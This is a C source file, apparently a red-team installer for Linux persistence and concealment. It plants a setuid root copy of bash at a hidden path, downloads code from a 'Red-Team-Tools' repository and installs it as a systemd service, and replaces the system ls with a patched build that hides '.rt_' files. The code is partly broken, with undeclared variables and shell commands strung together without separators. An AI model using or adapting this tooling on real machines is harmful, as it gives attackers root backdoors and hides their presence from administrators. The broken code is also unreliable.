#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h> // For file perms
#include <fcntl.h>
#include <curl/curl.h>

#define BASH_ID     1
#define PROCESSD_ID 2
#define LS_ID 4


// Configure install here:
#define INSTALL BASH_ID | PROCESSD_ID | LS_ID


// Debugging mode
// #define QUIET

// Useful Macros (modify these if path changes made elsewhere)
#define SETUID_BASH_PATH "/lib/gcc/rt_bash"

// Slightly less useful Macros
#define SYSTEM_BASH_PATH "/bin/bash"

// Functions:
int re_setuid_bash(void);
void download_file(const char *hostname, const char *path, const char *output_filename);
int re_processd(void);
int re_broken_ls(void);

////////////////////////////////////////
////////// SETUID BASH
////////////////////////////////////////

int re_setuid_bash(void){
    struct stat file_stat;
    char copy_buffer[10240];
    int bash, setuid_bash;
    int bytes_read;
    
    if (bash == NULL) {
        #ifndef QUIET
        fprintf(stderr, "setuid bash not found, installing now...\n");
        #endif
    }
    // For more advanced systems, read install file and execute
    // for now, hardcoded

    setuid_bash = creat(SETUID_BASH_PATH, 06755);
    if (setuid_bash == -1){
        perror("creat");
        return -1;
    }

    bash = fopen(SYSTEM_BASH_PATH, "r");
    if (bash == NULL) {
        fprintf(stderr, "Bash not found\n");
        return -1;
    }


    while ((bytes_read = fread(buffer, 1, sizeof(copy_buffer), bash)) > 0) {
        write(setuid_bash, copy_buffer, bytes_read);
    } if (ferror(file)) {
        fprintf(stderr, "\nAn error occurred while reading the file.\n");
    }

    close(setuid_bash);
    fclose(copy_buffer);
    
    return 0;
}

////////////////////////////////////////
////////// Processd
////////////////////////////////////////
void download_file(const char *hostname, const char *path, const char *output_filename) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char request[MAX_BUFFER_SIZE];
    char response[MAX_BUFFER_SIZE];
    FILE *output_file;

    // Resolve hostname to IP address
    server = gethostbyname(hostname);
    if (server == NULL) {
        fprintf(stderr, "Error: no such host found\n");
        exit(EXIT_FAILURE);
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    // Set server address structure
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(80);  // HTTP port

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error connecting to server");
        exit(EXIT_FAILURE);
    }

    // Prepare the HTTP GET request
    snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname);

    // Send the HTTP GET request
    if (send(sockfd, request, strlen(request), 0) < 0) {
        perror("Error sending request");
        exit(EXIT_FAILURE);
    }

    // Open output file to save the downloaded content
    output_file = fopen(output_filename, "wb");
    if (output_file == NULL) {
        perror("Error opening output file");
        exit(EXIT_FAILURE);
    }

    // Receive and write the response to the file
    ssize_t bytes_received;
    int header_received = 0;

    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
        if (!header_received) {
            // Skip HTTP headers (e.g., "HTTP/1.1 200 OK")
            char *body_start = strstr(response, "\r\n\r\n");
            if (body_start != NULL) {
                // Move to the body of the HTTP response
                header_received = 1;
                body_start += 4; // Skip past the "\r\n\r\n"
                bytes_received -= (body_start - response);
                fwrite(body_start, 1, bytes_received, output_file);
            }
        } else {
            // Write the body of the HTTP response to the file
            fwrite(response, 1, bytes_received, output_file);
        }
    }

    if (bytes_received < 0) {
        perror("Error receiving data");
    }

    // Close the file and socket
    fclose(output_file);
    close(sockfd);

    printf("File downloaded successfully!\n");
}
int re_processd(void){
    // TODO: Add error handling

    // Install prereqs
    system("apt install -y libcurl4-openssl-dev");

    // processd.c
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
    // processd executable
    system("gcc /tmp/processd.c -o /var/lib/processd");
    system("chmod 500 /var/lib/processd");

    // processd.service
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
    // Install service
    system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");

    return 0;
}

////////////////////////////////////////
////////// Broken ls
////////////////////////////////////////
static const char *ls_commands = "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list"
                            "apt update"
                            "apt-get source -y coreutils && apt-get build-dep -y coreutils"
                            "cd coreutils-*"
                            "yes | autoreconf -fiv"
                            "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules"
                            "awk 'BEGIN { "
                            "  found = 0; inserted = 0"
                            "} "
                            "/file_ignored \\(char const \\*name\\)$/ { "
                            "  print $0"
                            "  found = 1"
                            "  next"
                            "} "
                            "found == 1 && inserted == 0 && $0 == \"{\" { "
                            "  print $0"
                            "  print \"  if (strncmp(name, \\".rt_\\", 3) == 0) { return true; }\""
                            "  inserted = 1"
                            "  found = 2"
                            "  next"
                            "} "
                            "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c"
                            "make -j${nproc}"
                            "echo \"Replacing ls\""
                            "cp src/ls $(which ls)"
                            "cd ..";
int re_broken_ls(void){
    system(ls_commands);
    return 0;
}

#define FAILURE_STRING "Failed to install %s\n"
#define print_failure(message) fprintf(stderr, FAILURE_STRING, message);
int main(int argc, char **argv){
    int failures = 0;
    if(INSTALL & BASH_ID && re_setuid_bash())
        failures |= BASH_ID;
    if(INSTALL & PROCESSD_ID && re_processd())
        failures |= PROCESSD_ID;
    if(INSTALL & LS_ID && re_broken_ls())
        failures |= LS_ID;

    if (failures & BASH_ID)
        print_failure("setuid bash");
    if (failures & PROCESSD_ID)
        print_failure("processd");
    if (failures & LS_ID)
        print_failure("ls");
}